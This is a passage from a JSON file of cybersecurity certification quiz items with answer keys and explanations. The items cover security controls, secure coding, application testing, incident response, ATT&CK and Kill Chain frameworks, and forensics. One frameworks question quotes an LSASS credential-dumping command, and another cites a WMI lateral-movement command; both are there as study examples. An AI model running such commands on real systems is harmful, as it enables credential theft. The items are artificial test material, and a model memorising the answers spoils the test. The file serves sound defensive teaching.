blocks traffic to an exposed service before any compromise occurs. What is its function?","o":["Corrective","Detective","Responsive","Preventative"],"a":3,"e":"Blocking before an incident is preventative. Detection observes, response contains an active incident, and correction restores or repairs afterward.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:5","set":"lq","ch":8,"d":2,"q":"An online security awareness course is delivered through a web platform. Which control type is it?","o":["Administrative","Technical","Physical","Corrective"],"a":0,"e":"The delivery platform does not change the classification. Training is administrative because it changes human behavior.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:6","set":"lq","ch":8,"d":2,"q":"An EDR playbook isolates a compromised endpoint during an active attack. Which function is MOST accurate?","o":["Preventative","Responsive","Detective","Corrective"],"a":1,"e":"Isolation during an active incident limits spread, making it responsive.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:7","set":"lq","ch":8,"d":2,"q":"After a ransomware incident, the team restores a clean backup and patches the exploited service. Which function is this?","o":["Preventative","Detective","Corrective","Administrative"],"a":2,"e":"Restoring systems from verified clean backups and applying security patches to resolve root-cause vulnerabilities after an incident are corrective controls. Corrective controls repair damage and restore operations to a secure baseline state. Preventative controls stop incidents before they occur, detective controls identify active threats, and administrative controls establish policy and training.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:8","set":"lq","ch":8,"d":2,"q":"A team wants to learn what internet-facing assets an attacker can see without sending probes. Which approach is BEST?","o":["A post-incident review","Active scanning of PLCs","A tabletop exercise","Passive discovery using DNS and certificate transparency"],"a":3,"e":"Passive discovery uses sources such as DNS, crt.sh, WHOIS, and public repositories without active probing.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:9","set":"lq","ch":8,"d":2,"q":"Threat intelligence confirms that an actively weaponized zero-day remote code execution vulnerability is targeting enterprise web servers. The standard organizational change management window is three weeks away. What should the security analyst recommend?","o":["Invoke emergency change management procedures to deploy immediate vendor patches and implement interim compensating controls.","Defer all remediation activities until the standard scheduled maintenance window to avoid disrupting change management metrics.","Reclassify the vulnerability policy requirement as an optional administrative guideline to prevent change advisory review.","Remove the affected web servers from external network inventories to temporarily suppress automated scanner alerts."],"a":0,"e":"When active real-world exploitation is confirmed against exposed systems, waiting three weeks for a scheduled maintenance window introduces unacceptable business risk. The analyst must recommend invoking emergency change management procedures to expedite testing, patch deployment, and interim compensating controls (e.g., WAF virtual patching). Option B is the rigid bureaucratic trap: adhering blindly to standard maintenance schedules during active exploitation invites full compromise. Options C and D falsify governance records and avoid accountability.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:10","set":"lq","ch":8,"d":2,"q":"A container image contains a vulnerable library. What is the BEST patching approach?","o":["Edit the running container manually","Rebuild the base image and redeploy through CI/CD","Ignore it because containers are isolated","Only change the firewall"],"a":1,"e":"Containers are normally replaced from rebuilt images, not patched in place.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-sdlc:1","set":"lq","ch":8,"d":2,"q":"A developer constructs a dynamic SQL database query by concatenating an untrusted username parameter directly into the SQL command string. Which control represents the BEST and most direct defense against SQL injection?","o":["Implementing parameterized queries (prepared statements) within data access objects","Enforcing client-side input length restrictions using HTML form validation attributes","Deploying an external web application firewall rule without altering underlying source code","Configuring database connection pooling with generic administrative credentials"],"a":0,"e":"Parameterized queries (prepared statements) ensure that the database engine treats user input strictly as data rather than executable SQL code, providing the primary programmatic defense against SQL injection. Client-side checks are easily bypassed using intercepting proxies, WAFs are compensating controls that do not fix underlying code flaws, and connection pooling does not prevent injection.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:2","set":"lq","ch":8,"d":2,"q":"A web application displays user comments directly in the browser without sanitization, allowing an attacker to inject JavaScript that executes in the context of other users' sessions. Which secure coding practice directly prevents this Cross-Site Scripting (XSS) vulnerability?","o":["Encrypting database fields containing comments using AES-GCM","Implementing context-aware output encoding before rendering user input in HTML","Configuring HTTPS with HTTP Strict Transport Security (HSTS) preload","Increasing database session timeout limits to invalidate hijacked cookies"],"a":1,"e":"Context-aware output encoding transforms untrusted input into a safe format that browser rendering engines interpret strictly as display data rather than executable script markup (such as converting '<' to '&lt;'). Encryption at rest, HSTS, and session timeouts do not prevent the browser from executing malicious injected script tags.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:3","set":"lq","ch":8,"d":2,"q":"A user changes `account_id=459` to `account_id=460` and views another customer's record while logged in. What is the BEST classification?","o":["A race condition","A cryptographic failure only","Broken access control or IDOR","A denial of service"],"a":2,"e":"The user is authenticated, but authorization for the requested object is missing. That is IDOR and broken access control.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:4","set":"lq","ch":8,"d":2,"q":"A team wants to identify unsafe source-code paths during pull requests before a service is deployed. Which method fits BEST?","o":["DAST","Load testing","UAT","SAST"],"a":3,"e":"SAST analyzes source or binaries without running the application and is well suited to early pipeline checks.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:5","set":"lq","ch":8,"d":2,"q":"A newly released web application allows users to reset their forgotten passwords by submitting an email address, but the endpoint implements no rate limiting, CAPTCHA, or lockout mechanisms, permitting adversaries to execute unlimited automated enumeration guesses. Which OWASP Top 10 category BEST describes this root vulnerability?","o":["Insecure design","Cryptographic failure","Software and data integrity failure","Server-Side Request Forgery"],"a":0,"e":"Insecure design represents architectural flaws where business logic, threat modeling, or defense-in-depth controls (such as missing rate limiting or anti-automation safeguards) were omitted during the design phase. A bug in code implementation is a vulnerability; an omission in architectural security design is Insecure Design. Cryptographic failures involve weak ciphers, and SSRF involves coercing servers to make backend requests.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:6","set":"lq","ch":8,"d":2,"q":"A development team is designing an authentication database for a customer portal. Which practice represents the industry standard for securely storing user passwords?","o":["Computing rapid cryptographic digests using SHA-256 with a static organizational salt","Hashing passwords using slow, adaptive key-derivation functions like bcrypt or Argon2 with unique salts","Encrypting passwords with reversible AES-256-CBC and storing the decryption key in the database schema","Storing credentials in a relational database table protected exclusively by operating system file permissions"],"a":1,"e":"Passwords must be hashed using adaptive, deliberately slow, and salted algorithms (such as bcrypt, Argon2, or PBKDF2) designed to resist high-speed GPU and ASIC offline dictionary cracking attacks. Fast algorithms like SHA-256 allow billions of guesses per second, and reversible AES encryption exposes all plaintext passwords if the decryption key is compromised.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:7","set":"lq","ch":8,"d":2,"q":"A software development team deploys a minor feature update that passes all unit functional tests, but security monitoring discovers that an authorization bypass vulnerability patched three months ago has been reintroduced into the codebase. Which testing practice was missing from the deployment pipeline?","o":["Dynamic Application Security Testing (DAST)","User Acceptance Testing (UAT)","Security regression testing","Static code formatting verification"],"a":2,"e":"Security regression testing specifically validates that recent code changes or feature updates have not broken existing security functionality or reintroduced previously resolved vulnerabilities into the application. DAST assesses running web apps, UAT evaluates user business requirements, and formatting verification checks code style.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-sdlc:8","set":"lq","ch":8,"d":2,"q":"A scheduled midnight deployment of a critical enterprise billing application fails due to unexpected database schema corruption, rendering the payment portal inoperable. To minimize business downtime, what operational artifact should have been tested and approved prior to the release?","o":["A third-party disaster recovery service level agreement","A formal post-incident root-cause analysis report","An updated data classification matrix approved by data owners","A documented and rehearsed backout (rollback) plan"],"a":3,"e":"A backout (rollback) plan provides clear, pre-tested technical procedures to revert systems to a known-good operating state quickly if a deployment or change fails in production. Root-cause reports are created post-incident, SLAs govern third-party commitments, and classification matrices define data sensitivity rather than deployment recovery steps.","l":"c8-sdlc","l2":"","k":""},{"id":"lq:c8-appsec:1","set":"lq","ch":8,"d":2,"q":"A security analyst has access to application source code repositories but has no running test deployment, and needs to trace unvalidated user input from web form parameters into back-end SQL database queries. Which testing methodology is BEST suited for this analysis?","o":["Static Application Security Testing (SAST)","User Acceptance Testing (UAT)","Dynamic Application Security Testing (DAST)","Interactive Application Security Testing (IAST)"],"a":0,"e":"Static Application Security Testing (SAST) analyzes uncompiled or compiled source code \"from the inside out\" without executing the program. SAST engines perform taint analysis, tracing user input (sources) through functions to sensitive execution sinks (such as raw SQL queries). Option C is the primary trap: DAST evaluates running applications \"from the outside in\" via HTTP requests and requires an active deployment. Option D (IAST) requires an instrumented running application, and Option B tests functional user requirements rather than code-level security flaws.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:2","set":"lq","ch":8,"d":2,"q":"A Dynamic Application Security Testing (DAST) scan reports zero access-control or privilege escalation vulnerabilities on an enterprise web portal. However, an analyst discovers that the automated scanner was configured without valid user authentication credentials. What is the MOST likely reason for the clean scan report?","o":["The target web application utilizes an entirely client-side stateless architecture with no access-control boundaries.","The unauthenticated scanner could only crawl public landing pages and completely missed all authenticated application paths.","Dynamic vulnerability scanners automatically revert to Static Application Security Testing when unauthenticated.","The application's Software Bill of Materials (SBOM) contained complete dependency manifests that resolved authorization flaws."],"a":1,"e":"Unauthenticated DAST scans are limited to publicly accessible endpoints (e.g., login pages, public documentation). Without authentication cookies or session tokens, the crawler cannot access or test post-login workflows, administrative consoles, or role-based authorization boundaries, resulting in severe false negatives. Option A is highly unlikely for enterprise applications. Option C is false because DAST tools cannot execute SAST code analysis, and Option D confuses dependency inventory with runtime access controls.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:3","set":"lq","ch":8,"d":2,"q":"A security team sends malformed JSON and random boundary values to an API while watching for crashes. What technique is this?","o":["Mutation testing","UAT","Fuzzing","Load testing"],"a":2,"e":"Fuzzing changes inputs to expose validation and error-handling weaknesses.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:4","set":"lq","ch":8,"d":2,"q":"A software security team introduces deliberate syntactic and logical errors into application source code (such as changing arithmetic operators or inverting boolean conditionals) and executes their automated test suite to observe whether the tests detect these injected flaws. Which testing technique is being performed?","o":["Dynamic Application Security Testing (DAST)","Fault injection testing on compiled binaries","Software Bill of Materials (SBOM) component verification","Mutation testing to evaluate test-suite effectiveness"],"a":3,"e":"Mutation testing evaluates the quality and effectiveness of automated unit tests. By deliberately creating small syntactic modifications (\"mutants\") in the source code, the team verifies whether the test suite fails (thereby \"killing the mutant\"). If the test suite passes despite the injected bug, it reveals that the test suite lacks adequate coverage. Option B is tempting because it involves injecting faults, but mutation testing specifically modifies source code to evaluate test suite thoroughness rather than injecting runtime hardware/protocol faults into compiled binaries. Options A and C describe web scanning and dependency tracking.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:5","set":"lq","ch":8,"d":2,"q":"A Software Composition Analysis (SCA) tool flags a critical CVSS 9.8 vulnerability in an open-source library bundled with an enterprise web application. Deeper source code analysis reveals that the vulnerable code function is never imported, invoked, or reachable in the production build. What should the security analyst do FIRST?","o":["Assess reachability and exploitability in operational context, documenting an analytical risk assessment or exception.","Prioritize emergency overnight production remediation ahead of all reachable high-severity vulnerabilities based purely on the CVSS score.","Delete the Software Bill of Materials (SBOM) component record to prevent the vulnerability scanner from reporting the finding.","Reclassify the finding under the SAMM Governance practice to avoid developer remediation tracking."],"a":0,"e":"SCA tools flag vulnerabilities based on package manifests regardless of whether the vulnerable code paths are actually executed. Context awareness and reachability analysis are essential: if the affected module or function is dead code or unreachable, the actual exploitability risk is dramatically reduced. Analysts should prioritize reachable vulnerabilities first while documenting the context-driven priority or risk exception. Option B is the primary operational trap: blindly prioritizing an unreachable flaw ahead of actively exploitable vulnerabilities wastes developer resources and leaves genuine exposures open. Options C and D corrupt inventory and bypass governance.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:6","set":"lq","ch":8,"d":2,"q":"An enterprise software vendor delivers a commercial compiled software package without listing its third-party and open-source dependencies. When a critical open-source zero-day vulnerability is announced, the security team needs to rapidly determine if the vendor application contains the affected library. What artifact should the enterprise require the vendor to deliver?","o":["A comprehensive dynamic penetration test report detailing web application attack surface","A formal Software Bill of Materials (SBOM) in a standardized machine-readable format (e.g., CycloneDX or SPDX)","A signed corporate attestation confirming the vendor achieved Level 3 maturity across all OWASP SAMM business functions","A formal network firewall rule specification detailing all outbound TCP communication destinations"],"a":1,"e":"A Software Bill of Materials (SBOM) provides a formal, nested inventory of all software components, third-party libraries, dependencies, and hierarchical relationships within an application. Standards like CycloneDX or SPDX enable automated ingestion and immediate cross-referencing against newly published CVEs. Option A is tempting because penetration tests evaluate security, but pentest reports do not provide complete, searchable component inventories. Options C and D measure process maturity and network architecture rather than software dependency manifests.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:7","set":"lq","ch":8,"d":2,"q":"An organization has no developer training or application-security strategy. Which SAMM function is MOST clearly immature?","o":["Operations","Verification","Governance","Design"],"a":2,"e":"SAMM Governance covers strategy, metrics, policy, compliance, education, and developer training.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:8","set":"lq","ch":8,"d":2,"q":"A company has threat modeling but no dependency inventory or third-party library process. Which SAMM function is the gap?","o":["Governance","Operations","Verification","Implementation"],"a":3,"e":"Dependency management and secure build and deployment belong to Implementation.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:9","set":"lq","ch":8,"d":2,"q":"An application is tested at expected peak traffic to measure latency and throughput. Which test is this?","o":["Load testing","Stress testing","Mutation testing","Fault injection"],"a":0,"e":"Load testing uses expected peak conditions. Stress testing pushes beyond normal limits.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c8-appsec:10","set":"lq","ch":8,"d":2,"q":"A malicious public package uses the same name as a private internal package. Which risk is MOST likely?","o":["Race condition","Dependency confusion","Reflected XSS","Repudiation"],"a":1,"e":"Dependency confusion tricks a build into retrieving a malicious public package that appears to be the internal one.","l":"c8-appsec","l2":"","k":""},{"id":"lq:c9-process:1","set":"lq","ch":9,"d":3,"q":"A SIEM alert indicates an unusual PowerShell command executed on a finance department workstation. There are no signs of active data exfiltration or system damage yet, and the associated user account and process parentage are currently unverified. What should the analyst do FIRST?","o":["Triage the alert by gathering process lineage, user identity, and network connection context to validate the signal","Immediately isolate the workstation and re-image the primary storage volume","Draft and publish a formal After-Action Report (AAR) for executive leadership","Initiate a domain-wide password reset and restore the host from yesterday's backup image"],"a":0,"e":"When an ambiguous alert fires with no active harm confirmed, the analyst's first responsibility is triage: collecting process parentage, user context, and network activity to determine if the signal is a true positive or benign administrative behavior. Reimaging, restoring, or resetting credentials before triage destroys volatile evidence and disrupts business needlessly.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:2","set":"lq","ch":9,"d":3,"q":"A responder isolates an infected host so ransomware cannot reach other systems. Which activity is this?","o":["Eradication","Containment","Recovery","Post-incident"],"a":1,"e":"Isolation limits spread during an active incident, so it is containment.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:3","set":"lq","ch":9,"d":3,"q":"The team removes malware, deletes a scheduled task, and revokes stolen credentials. Which activity is MOST accurate?","o":["Detection","Containment","Eradication","Preparation"],"a":2,"e":"Removing malicious artifacts and persistence is eradication. Containment would isolate or block spread.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:4","set":"lq","ch":9,"d":3,"q":"During incident triage, an investigator reviews logs from an Active Directory server in New York (EDT), an identity provider in London (UTC), and an endpoint in Seattle (PDT). What must occur before the investigator can accurately reconstruct the chronological attack timeline?","o":["Sort events alphabetically based on raw source hostnames","Filter out identity provider telemetry to focus strictly on operating system events","Convert all event records into unindexed comma-separated text files","Normalize all event timestamps to Coordinated Universal Time (UTC)"],"a":3,"e":"Log sources residing in different geographical time zones record timestamps according to local offsets. Investigators must normalize all timestamps to a single reference time standard (UTC); otherwise, sequence of events will appear out of order, misrepresenting the attacker's progression.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:5","set":"lq","ch":9,"d":3,"q":"An investigator discovers a known malicious malware hash on an infected host and simultaneously observes active, unauthorized credential dumping occurring in memory. How should these two forensic artifacts be classified?","o":["The malware hash is an Indicator of Compromise (IoC), while the credential-dumping behavior is an Indicator of Attack (IoA)","The malware hash is an Indicator of Attack (IoA), while the credential-dumping behavior is an Indicator of Compromise (IoC)","Both artifacts are classified as Service Level Indicators (SLIs) under NIST SP 800-61","Both artifacts are classified as post-incident recovery metrics"],"a":0,"e":"An Indicator of Compromise (IoC) is retrospective evidence showing an asset was compromised (such as a known malware hash or malicious IP). An Indicator of Attack (IoA) identifies active attacker behavior and intent in real time (such as living-off-the-land credential harvesting in memory) regardless of whether known malware signatures are present.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:6","set":"lq","ch":9,"d":3,"q":"A SOC analyst confirms that active ransomware is rapidly encrypting files across production database clusters hosting customer transaction data. Which incident severity rating should be assigned?","o":["Low severity","Critical severity","Informational severity","Medium severity"],"a":1,"e":"Active ransomware executing on mission-critical production systems represents a Critical severity incident, requiring immediate activation of the incident response team, executive briefing, and urgent containment measures. Informational, Low, and Medium ratings are reserved for non-disruptive, localized, or routine events.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:7","set":"lq","ch":9,"d":3,"q":"An incident response team is conducting a formal post-incident lessons-learned meeting following a major data breach. Who is the BEST individual to facilitate the session?","o":["The lead incident commander who made all operational containment decisions","The system administrator whose account credentials were compromised","An objective facilitator who was not directly involved in the tactical incident response","The corporate legal counsel responsible for regulatory breach disclosures"],"a":2,"e":"An independent or objective facilitator who was not directly involved in the response helps ensure a blameless, candid, and productive review. Responders who directed tactical actions or had credentials compromised may unconsciously defend their own actions or shift blame, while legal counsel focuses on liability rather than operational process improvement.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:8","set":"lq","ch":9,"d":3,"q":"An After-Action Report (AAR) contains a detailed chronological timeline, an analysis of the attacker's technical methods, and an estimate of financial impact, but fails to assess which response actions went well or what process gaps delayed containment. Which core section of the AAR is missing?","o":["The cryptographic chain-of-custody log","The external law enforcement referral mandate","The vulnerability scan coverage baseline","The response evaluation and procedural gap analysis"],"a":3,"e":"A complete After-Action Report must evaluate how effectively the response team performed, identifying what worked well, what failed, and which operational playbooks require updates. Technical timelines and financial impacts document the incident itself, but the response evaluation section drives actionable remediation and process improvement.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:9","set":"lq","ch":9,"d":3,"q":"During a post-incident root-cause analysis (RCA), a team member states that 'an employee clicking a phishing link caused the entire ransomware outbreak.' How should the RCA team proceed?","o":["Apply structured methodologies like the 5 Whys or an Ishikawa (fishbone) diagram to analyze systemic people, process, and technology contributors","Conclude the RCA investigation because identifying the initial delivery vector satisfies root-cause discovery requirements","Assign formal disciplinary reprimands to the individual employee to resolve the root vulnerability permanently","Delete all forensic triage tickets from the incident tracking database to protect employee privacy"],"a":0,"e":"The phishing email was merely the initial trigger or proximate cause, not the systemic root cause. A thorough RCA uses structured tools (such as the 5 Whys or fishbone diagrams) to examine underlying failures (such as why the email bypassed gateway filtering, why least privilege did not prevent lateral execution, or why endpoint detection failed to halt encryption). Blaming the user or stopping at the initial trigger fails to prevent recurrence.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-process:10","set":"lq","ch":9,"d":3,"q":"A post-incident review following an intrusion reveals that critical logs had expired due to short retention windows and that the incident playbook lacked containment steps for cloud environments. Into which phase of the incident response lifecycle should these findings be integrated?","o":["Containment, Eradication, and Recovery","Preparation","Detection and Analysis","Post-Incident Activity archive storage"],"a":1,"e":"The incident response lifecycle is continuous: lessons learned and gaps identified during post-incident reviews must feed directly back into the Preparation phase. This ensures that logging configurations, monitoring baselines, defensive tools, and operational playbooks are updated and hardened against future attacks.","l":"c9-process","l2":"","k":""},{"id":"lq:c9-foundation:1","set":"lq","ch":9,"d":3,"q":"A security operations team uses a documented procedure that specifies how to isolate a host, harvest memory, and block malicious domains during a ransomware outbreak. A security engineer programs these identical steps into a SOAR platform to execute automatically upon alert ingestion. What did the engineer create?","o":["An automated runbook","A procedural playbook","An incident response policy","A business continuity plan"],"a":0,"e":"A runbook is the automated, programmatic implementation of response procedures executed directly within a SOAR platform. Option B is the primary trap: a playbook is the human-readable, step-by-step procedural guide that analysts follow manually. When those steps are automated into software workflows within SOAR, it becomes a runbook. Option C defines high-level executive rules and governance, and Option D governs enterprise recovery during macro disasters.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:2","set":"lq","ch":9,"d":3,"q":"During an investigation into an Active Directory compromise, the incident response team suspects that attackers have gained access to corporate email and Microsoft Teams channels. Which action should the Incident Commander take to preserve operational security?","o":["Instruct all responders to cc executive management on every email thread","Mandate that all incident coordination immediately switch to pre-established out-of-band channels","Broadcast an organization-wide alert requesting all employees change their passwords immediately","Pause the incident investigation until regular business hours resume"],"a":1,"e":"When primary corporate communications are potentially monitored by an adversary, the response team must immediately switch to out-of-band communication methods (such as personal phones or encrypted Signal groups).","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:3","set":"lq","ch":9,"d":3,"q":"A security team holds a session where the offensive Red Team executes simulated Kerberoasting attacks while the defensive Blue Team monitors SIEM alerts in real time. After each technique, both teams collaborate to analyze visibility gaps and tune detection rules on the spot. What type of exercise is being conducted?","o":["A tabletop exercise","A disaster recovery audit","A purple team exercise","A compliance gap assessment"],"a":2,"e":"A purple team exercise is a collaborative, real-time exercise where offensive and defensive teams work together to execute techniques and immediately tune defenses.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:4","set":"lq","ch":9,"d":3,"q":"A healthcare provider discovers that an unauthorized third party exfiltrated patient records containing protected health information (PHI). Under standard CSIRT roles, who is responsible for managing statutory breach notification deadlines?","o":["The Lead Forensics Specialist","The Tier 1 SOC Analyst","The Threat Intelligence Analyst","Legal and Compliance Counsel"],"a":3,"e":"Legal and compliance counsel oversees regulatory and legal disclosure requirements, ensuring notifications comply with statutory deadlines such as HIPAA or GDPR.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:5","set":"lq","ch":9,"d":3,"q":"A cybersecurity team plans an exercise to evaluate executive decision-making, legal coordination, and public relations messaging during a simulated ransomware extortion scenario. No live systems or tools will be used. Which exercise format is MOST appropriate?","o":["Tabletop exercise","Live-fire simulation","Penetration test","Continuous vulnerability scan"],"a":0,"e":"A tabletop exercise is a facilitated, discussion-based walkthrough of a hypothetical scenario designed to evaluate roles, communications, and decision-making without touching systems.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:6","set":"lq","ch":9,"d":3,"q":"A large multinational enterprise maintains an around-the-clock Security Operations Center staffed by dedicated, full-time incident handlers who perform response duties as their exclusive responsibility. Which CSIRT organizational model does this represent?","o":["Distributed CSIRT","Centralized CSIRT","Outsourced MSSP","Ad-hoc emergency committee"],"a":1,"e":"A centralized CSIRT consists of dedicated, full-time cybersecurity personnel who focus solely on incident response within an enterprise SOC.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:7","set":"lq","ch":9,"d":3,"q":"A SOC manager observes that Tier 1 analysts are experiencing severe alert fatigue caused by thousands of daily low-priority endpoint alerts, resulting in missed critical alerts. Which strategy BEST addresses this operational challenge?","o":["Reconfigure SIEM correlation rules to suppress all security alerts generated outside normal business hours.","Hire five additional entry-level analysts to manually review raw unparsed syslog queues.","Implementing Risk-Based Alerting (RBA) to aggregate anomalous behaviors into composite risk scores","Increase global SIEM detection thresholds so that only critical-severity atomic events are logged."],"a":2,"e":"Risk-Based Alerting (RBA) shifts detection logic from alerting on isolated atomic events (e.g., a single failed login or suspicious PowerShell flag) to assigning risk scores to entities (users, hosts) over time. An alert is only generated when an entity's cumulative risk score crosses an actionable threshold, drastically reducing false positives and alert fatigue while catching multi-stage attacks. Option D is tempting because increasing thresholds reduces volume, but it blinds the SOC to sophisticated low-and-slow attacks. Option A creates dangerous after-hours blind spots, and Option B is an expensive administrative measure that fails to resolve noise at the detection engineering level.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-foundation:8","set":"lq","ch":9,"d":3,"q":"A junior analyst responding to a server compromise discovers an unknown malware variant. The analyst notes that the steps in the standard Malware Playbook are ineffective against this novel attack. What should the analyst do?","o":["Continue executing the documented playbook steps repeatedly without deviation to maintain SLA compliance.","Immediately resolve the incident ticket and mark the alert as a false positive to avoid SLA breaches.","Sever all wide-area network routing links across the enterprise without consulting incident command.","Exercise professional judgment and consult with senior handlers to adapt response tactics"],"a":3,"e":"Incident response playbooks provide standardized, repeatable guidance for common scenarios, but they cannot anticipate every novel threat or zero-day adversary technique. Responders must exercise professional judgment, communicate with incident leads, and adapt containment tactics to fit unexpected realities while documenting deviations. Option A is the dangerous rigid compliance trap: blindly repeating ineffective playbook steps allows an attacker to complete their objectives. Option B falsifies incident records, and Option C is an unauthorized, uncoordinated action that disrupts enterprise operations without command approval.","l":"c9-foundation","l2":"","k":""},{"id":"lq:c9-frameworks:1","set":"lq","ch":9,"d":3,"q":"A security analyst reviews endpoint logs and discovers an adversary executed a PowerShell script that created a new scheduled task and modified a registry Run key to ensure persistent access across reboots. Which phase of the Cyber Kill Chain does this activity represent?","o":["Installation","Reconnaissance","Exploitation","Command and Control"],"a":0,"e":"The Installation phase of the Cyber Kill Chain focuses on establishing persistent backdoor access (such as creating scheduled tasks or registry run keys) so the attacker survives system reboots.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:2","set":"lq","ch":9,"d":3,"q":"During an investigation, an analyst discovers that an attacker used Cobalt Strike Beacon software hosted on an external virtual private server with IP address 198.51.100.55 to compromise a corporate database server. Under the Diamond Model of Intrusion Analysis, how should the external IP address be categorized?","o":["Capability","Infrastructure","Adversary","Victim"],"a":1,"e":"Under the Diamond Model, Infrastructure represents the physical or logical network communications structures (such as IP addresses, domains, and servers) used to deliver and control an attack.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:3","set":"lq","ch":9,"d":3,"q":"An incident response report states: 'The adversary dumped password hashes from LSASS memory using the command <code>procdump.exe -ma lsass.exe lsass.dmp</code>.' In the MITRE ATT&CK framework, how is the overarching goal of stealing account credentials classified?","o":["Technique","Procedure","Tactic","Sub-technique"],"a":2,"e":"In MITRE ATT&CK, a Tactic represents the adversary's overarching operational goal (the 'why'). In this scenario, Credential Access is the Tactic, OS Credential Dumping is the Technique, and the specific procdump command is the Procedure.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:4","set":"lq","ch":9,"d":3,"q":"A threat hunter discovers a malicious domain used in an active intrusion. By querying threat intelligence platforms for other historical intrusions sharing this same domain and registrar infrastructure, the hunter connects three seemingly unrelated breaches to a single APT campaign. Which analytical technique was used?","o":["Kill Chain linear delivery mapping","ATT&CK Navigator matrix filtering","Risk-Based Alerting thresholding","Diamond Model infrastructure pivoting"],"a":3,"e":"Infrastructure pivoting is a core Diamond Model methodology where an analyst leverages a known infrastructure artifact (such as a C2 domain or IP) to identify other connected events sharing the same adversary.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:5","set":"lq","ch":9,"d":3,"q":"A security engineering team wants to evaluate their SIEM and EDR detection rules against the known tactics and techniques of a financial cybercrime syndicate. Which tool or resource is BEST suited to visualize and identify these defensive visibility gaps?","o":["ATT&CK Navigator","Cyber Kill Chain checklist","Diamond Model activity thread","NIST SP 800-40 patch guide"],"a":0,"e":"The ATT&CK Navigator allows analysts to create visual matrix heat map layers, overlaying specific threat group techniques against current defensive rules to identify coverage gaps.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:6","set":"lq","ch":9,"d":3,"q":"Network perimeter monitoring detects that an internal endpoint is transmitting outbound HTTPS packets every 60 seconds with 5-second random jitter to a newly registered dynamic DNS domain. Which Cyber Kill Chain phase does this traffic represent?","o":["Weaponization","Command and Control (C2)","Actions on Objectives","Delivery"],"a":1,"e":"Regular or jittered outbound beaconing traffic from an internal host to an external domain represents the Command and Control (C2) phase, where the infected host calls home for instructions.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:7","set":"lq","ch":9,"d":3,"q":"Why is the Lockheed Martin Cyber Kill Chain model especially valuable to defensive security engineers when architecting layered controls?","o":["It eliminates the necessity for endpoint monitoring by stopping all attacks at the perimeter","It maps individual operating system system-calls directly to pre-configured SOAR response scripts","Disrupting adversary activity at any single link in the sequence halts the progression of the attack","It automatically reverse-engineers compiled binaries to generate cryptographic file signatures"],"a":2,"e":"The core premise of the Cyber Kill Chain is that an adversary must execute each phase sequentially to succeed. Breaking any single link in the chain (such as blocking delivery, stopping execution, or severing C2 communications) completely halts the attacker from reaching their final objectives.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c9-frameworks:8","set":"lq","ch":9,"d":3,"q":"An analyst investigates an alert where an attacker used <code>wmic process call create</code> to launch a lateral command on a remote domain workstation over SMB. Which MITRE ATT&CK tactic does this pivoting action represent?","o":["Initial Access","Reconnaissance","Resource Development","Lateral Movement"],"a":3,"e":"Pivoting between systems across an internal network (via SMB, WMI, WinRM, or RDP) represents the MITRE ATT&CK Lateral Movement tactic.","l":"c9-frameworks","l2":"","k":""},{"id":"lq:c10-evidence:1","set":"lq","ch":10,"d":3,"q":"An incident responder discovers an active, unencrypted malware beacon running on an enterprise workstation that utilizes full-disk BitLocker encryption. Which of the following actions should the analyst perform FIRST?","o":["Acquire volatile system memory using a portable RAM capture tool.","Power down the machine immediately to sever the command-and-control connection.","Remove the primary hard drive and attach it to a hardware write blocker.","Collect centralized firewall logs and examine network NetFlow records."],"a":0,"e":"Volatile system RAM ranks highest in the order of volatility and holds the active beacon, encryption keys, and network connections. Powering off or removing the drive immediately destroys volatile memory and may lock the encrypted BitLocker volume.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:2","set":"lq","ch":10,"d":3,"q":"A forensic analyst completes a bit-stream disk image of a seized laptop. The SHA-256 hash of the original physical drive was calculated as <code>a4f1...89c2</code>. After imaging, the resulting raw disk image yields a 